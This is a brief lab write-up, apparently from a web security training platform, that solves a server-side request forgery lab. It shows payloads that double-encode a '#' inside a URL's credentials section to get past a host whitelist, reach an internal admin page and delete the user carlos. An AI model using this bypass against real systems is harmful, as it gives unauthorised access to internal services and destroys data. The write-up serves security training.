# SSRF with whitelist-based input filter

1. SSRF: Stock check function.
2. Goal: Change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

### Analysis

1. Decode URL.
```bash
stockApi=http%3a//stock.weliketoshop.net%3a8080/product/stock/check%3fproductId%3d1%26storeId%3d1
# 36 products.

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
# "Missing parameter"
```

2. Test.
```bash
stockApi=http://localhost/
# "External stock check host must be stock.weliketoshop.net"

stockApi=http://localhost%25%32%33@stock.weliketoshop.net
# Double encode URL.
# Convert selection > URL > URL-encode all characters.
# admin panal.

stockApi=http://localhost%25%32%33@stock.weliketoshop.net/admin
# I found users in this admin page.

stockApi=http://localhost%25%32%33@stock.weliketoshop.net/admin/delete?username=carlos
# Click Follow redirection.
# Delete Carlos user.
```